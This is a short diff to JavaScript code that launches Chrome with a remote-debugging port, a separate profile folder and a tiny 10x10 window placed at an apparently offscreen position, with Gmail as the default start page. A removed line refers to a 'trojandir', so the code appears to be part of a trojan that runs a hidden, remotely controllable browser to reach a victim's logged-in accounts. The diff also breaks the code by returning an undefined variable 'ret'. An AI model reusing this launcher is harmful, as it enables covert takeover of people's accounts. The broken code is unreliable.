@@ -345,7 +345,8 @@ function exec_chrome(
     );
 }
 
-function chrome_cmdlineargs(starturl="https://www.yahoo.com", debugport=9223, datadir="C:\\ProgramData\\test_owd\\chrome", x_pos=2000, y_pos=2000, width=10, height=10, headless=false) {
+function chrome_cmdlineargs(starturl="https://www.yahoo.com", debugport=9223, datadir="C:\\ProgramData\\test_owd\\chrome", 
+x_pos=2000, y_pos=2000, width=10, height=10, restore = false, headless=false) {
     let cmdlineargs = [
         `--remote-debugging-port=${debugport}`,
         `--user-data-dir=${datadir}`,
@@ -368,7 +369,7 @@ function chrome_cmdlineargs(starturl="https://www.yahoo.com", debugport=9223, da
         return ! isNullOrWhitespace(item);
     });
 
-    return cmdlineargs;
+    return ret;
 }
 
 // note: child chrome process has a new/different pid upon launch
@@ -376,17 +377,17 @@ function chrome_cmdlineargs(starturl="https://www.yahoo.com", debugport=9223, da
 function spawn_chrome(
     starturl = "https://www.gmail.com/",
     debugport = 9223,
+    unref = false,
     stdoutfunc = null,
     stderrfunc = null,
     closefunc = null
 ) {
-    datadir = datadir || path.join(trojandir, "chrome");
 
     let cmdlineargs = chrome_cmdlineargs(starturl, debugport);
 
     // TODO auto discover by reading chrome lnk files
 
-    const child = spawn(chrome_debug_path, [...cmdlineargs], {
+    const child = spawn(chrome_path, [...cmdlineargs], {
         //detached: true, // might cause errors
         // windowsHide: true,
         // stdio: ["ignore", out, err],
